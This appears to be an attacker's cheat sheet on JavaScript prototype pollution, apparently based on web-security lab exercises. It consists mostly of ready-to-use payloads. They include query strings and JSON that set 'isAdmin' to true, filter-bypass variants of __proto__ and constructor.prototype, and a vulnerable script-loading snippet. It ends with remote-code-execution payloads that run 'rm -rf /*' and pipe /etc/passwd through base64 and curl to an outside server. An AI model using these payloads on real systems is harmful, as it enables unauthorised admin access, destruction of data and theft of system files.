# Prototype Pollution

```jsx
To test  
/?__proto__[foo]=payload
/?__proto__.foo=payload
> Browser Console
	Object.prototype

"__proto__": {
    "json spaces":10
}

To Attack For Ex:
	/?__proto__[value]=data:,alert(1);
	?__proto__.sequence=alert()-

Json 
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"143FNWEwAms4SEylySLmSXosMv9piC5c",
	"__proto__": {
    "isAdmin":true
	}
}

```

Vulnerable Code

```jsx
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
```

```jsx
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

Bypass

```jsx
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar

------------------------------------------------------

"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

RCE Via Subprocess

```jsx
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm -rf /*')"
    ]
}

"__proto__": {
	"shell":"vim",
	"input":":! cat /etc/passwd | base64 | curl -d @- http:myserver.net\n"
}
```